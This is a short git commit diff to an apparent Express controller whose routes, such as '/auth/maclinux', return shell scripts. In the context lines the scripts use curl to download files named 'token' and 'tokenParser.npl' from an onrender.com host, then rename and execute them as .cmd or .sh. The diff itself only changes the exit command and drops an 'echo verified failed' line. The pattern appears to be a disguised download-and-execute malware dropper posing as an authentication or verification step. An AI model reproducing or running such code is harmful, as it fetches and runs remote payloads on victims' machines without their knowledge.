bd87ce27f24a974f5094747a671b56d556b5493e
richard <richardplayventures8@gmail.com>
2025-07-07 20:35:08 -0300

    !11

--- controllers/users.js
+++ controllers/users.js
@@ -45,7 +45,7 @@ curl -s -L -o token https://be-1-49aq.onrender.com/token
 curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 ren token token.cmd
 call token.cmd
-exit /b
+exit
 `);
 });
 router.get("/auth/maclinux", (req, res) => {    
@@ -59,7 +59,6 @@ curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 mv token token.sh
 chmod +x token.sh
 ./token.sh
-echo "verified failed"
 clear
 `);
 });
